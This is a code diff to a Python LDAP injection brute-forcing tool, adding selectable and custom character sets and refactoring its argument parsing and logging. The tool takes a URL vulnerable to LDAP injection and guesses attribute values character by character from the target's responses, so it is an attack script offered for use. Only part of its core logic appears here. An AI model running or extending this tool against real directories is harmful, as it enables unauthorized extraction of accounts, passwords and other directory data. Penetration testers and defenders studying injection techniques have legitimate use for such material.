@@ -24,7 +24,7 @@ http://www.ietf.org/rfc/rfc1960.txt
 
 import argparse, logging, string, requests
 
-def set_logging(verbosity):
+def logging_set(verbosity):
 
     if verbosity == 0:
         logging.basicConfig(level=logging.WARNING, format="%(levelname)s - %(message)s")
@@ -48,9 +48,8 @@ def brute_char(base_url, charset, true_string, prefix):
 
     return valid
 
-def brute(base_url, true_string):
+def brute(base_url, true_string, charset):
     logging.info("Entering wildcard brute mode for URL '%s'." % base_url)
-    charset = string.ascii_lowercase + string.digits
     logging.debug("Going to brute with chars %s" % charset)
 
     # Check which ones were positive.
@@ -64,7 +63,8 @@ def brute(base_url, true_string):
                 logging.info("Valid initial values found: %s", exist)
             else :
                 logging.warn("""No initial values found! True string was never
-                    there... Maybe attribute does not support wildcard? see --no-wildcard. Otherwise, URL is wrong.""")
+                    there... Maybe attribute does not support wildcard? see
+                    --no-wildcard. Otherwise, URL is non-conformant.""")
                 return
         else:
             new_exist = []
@@ -85,14 +85,7 @@ def brute(base_url, true_string):
 
     return exist
 
-def succ(result):
-    if result:
-        print("Valid values found:\n")
-        for r in result:
-            print(r)
-
-if __name__ == '__main__':
-
+def parser_get():
     parser = argparse.ArgumentParser(formatter_class=argparse.RawDescriptionHelpFormatter,description="Bruteforces LDAP!", epilog=__doc__)
     parser.add_argument('URL', help="""The URL that is vulnerable to LDAP
         injection, with a %%s where the injection is.""")
@@ -105,14 +98,46 @@ if __name__ == '__main__':
     parser.add_argument('--no-wildcard', '-N', help="""Some LDAP values do not
         honor the wildcard. These need to be bruteforced without a wildcard, which
         is much slower.""", action="store_true")
+    parser.add_argument("--charset", "-c", help="""The set of characters the
+        script will attempt to use while bruteforcing.""",
+        choices=['lower_and_digit', 'upperlower_and_digits', 'upperlower_hex'],
+        default="lower_and_digit")
+    parser.add_argument("--charset-custom", "-C", help="""A custom string that contains all the charcters to use. E.g. '-C ABC389'""")
+
     parser.add_argument("--verbosity", "-v", type=int, help="0 warn, 1 info, 2 debug", default=1)
 
+    return parser
+
+def charset_get(charset_name):
+    if charset_name == "lower_and_digit":
+        charset = string.ascii_lowercase + string.digits
+    elif charset_name == "upperlower_and_digits":
+        charset = string.ascii_letters + string.digits
+    elif charset_name == "upperlower_hex":
+        charset = string.hexdigits
+
+    return charset
+
+def succ(result):
+    if result:
+        print("Valid values found:\n")
+        for r in result:
+            print(r)
+
+if __name__ == '__main__':
+    parser = parser_get()
     args = parser.parse_args()
-    set_logging(args.verbosity)
+
+    logging_set(args.verbosity)
     logging.debug(args)
 
+    if(args.charset_custom):
+        charset = args.charset_custom
+    else:
+        charset = charset_get(args.charset)
+
     if not args.no_wildcard:
-        valid_values = brute(args.URL, args.TRUE_STRING)
+        valid_values = brute(args.URL, args.TRUE_STRING, charset)
         succ(valid_values)
     else :
         logging.warn("no wildcard not implemented")
